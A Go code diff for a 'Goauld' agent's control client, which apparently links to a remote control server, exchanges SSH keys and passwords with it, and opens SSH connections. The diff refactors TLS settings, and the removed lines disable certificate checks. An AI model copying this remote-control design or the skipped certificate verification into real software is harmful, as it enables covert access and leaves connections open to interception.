@@ -2,17 +2,16 @@ package control
 
 import (
 	"Goauld/agent/agent"
+	"Goauld/agent/proxy"
 	"Goauld/agent/ssh"
 	"Goauld/common/crypto"
 	"Goauld/common/log"
 	socketio "Goauld/common/socket.io"
 	"context"
-	"crypto/tls"
 	"fmt"
 	sio "github.com/karagenc/socket.io-go"
 	eio "github.com/karagenc/socket.io-go/engine.io"
 	"github.com/quic-go/webtransport-go"
-	"net/http"
 	"nhooyr.io/websocket"
 )
 
@@ -26,6 +25,11 @@ func NewClient(ctx context.Context) error {
 		log.Trace().Msg("OnConnect")
 		log.Info().Msgf("Connected to the control server %s", url)
 	})
+	socket.OnConnectError(func(err any) {
+		log.Trace().Msg("OnConnectError")
+		log.Error().Msgf("Error occured connecting to %s (%v)", url, err)
+	})
+
 	manager.OnError(func(err error) {
 		log.Trace().Msg("OnError")
 		log.Error().Err(err).Msgf("Error occured  %s", url)
@@ -33,10 +37,6 @@ func NewClient(ctx context.Context) error {
 	manager.OnReconnect(func(attempt uint32) {
 		log.Trace().Msg("OnReconnect")
 		log.Warn().Msgf("Reconnected to the control server %s, attempts N° %d", url, attempt)
-	})
-	socket.OnConnectError(func(err any) {
-		log.Trace().Msg("OnConnectError")
-		log.Error().Msgf("Error occured connecting to %s (%v)", url, err)
 	})
 
 	socket.OnEvent(socketio.SendSshPrivateKeyEvent, func(data []byte) {
@@ -57,7 +57,7 @@ func NewClient(ctx context.Context) error {
 		socket.Emit(socketio.SendAgentSshPasswordEvent, localSshPassword)
 		log.Debug().Msgf("Conecting to remote ssh server")
 		ssh.Connect()
-		log.Warn().Msgf("Remote ssh server terminated")
+		log.Warn().Msgf("Conected")
 
 		log.Trace().Msg("OnEvent: SendSshPrivateKeyEvent done")
 	})
@@ -110,24 +110,12 @@ func getEioConfig() *sio.ManagerConfig {
 			UpgradeDone: func(transportName string) {
 				log.Trace().Msg("Client transport upgrade done")
 			},
-			HTTPTransport: &http.Transport{
-				TLSClientConfig: &tls.Config{
-					InsecureSkipVerify: true, // DO NOT USE in production. This is for self-signed TLS certificate to work.
-				},
-			},
+			HTTPTransport: proxy.NewTransportProxy(),
 			WebSocketDialOptions: &websocket.DialOptions{
-				HTTPClient: &http.Client{
-					Transport: &http.Transport{
-						TLSClientConfig: &tls.Config{
-							InsecureSkipVerify: true, // DO NOT USE in production. This is for self-signed TLS certificate to work.
-						},
-					},
-				},
+				HTTPClient: proxy.NewHttpClientProxy(),
 			},
 			WebTransportDialer: &webtransport.Dialer{
-				TLSClientConfig: &tls.Config{
-					InsecureSkipVerify: true, // DO NOT USE in production. This is for self-signed TLS certificate to work.
-				},
+				TLSClientConfig: proxy.NewTlsConfig(),
 			},
 		},
 	}
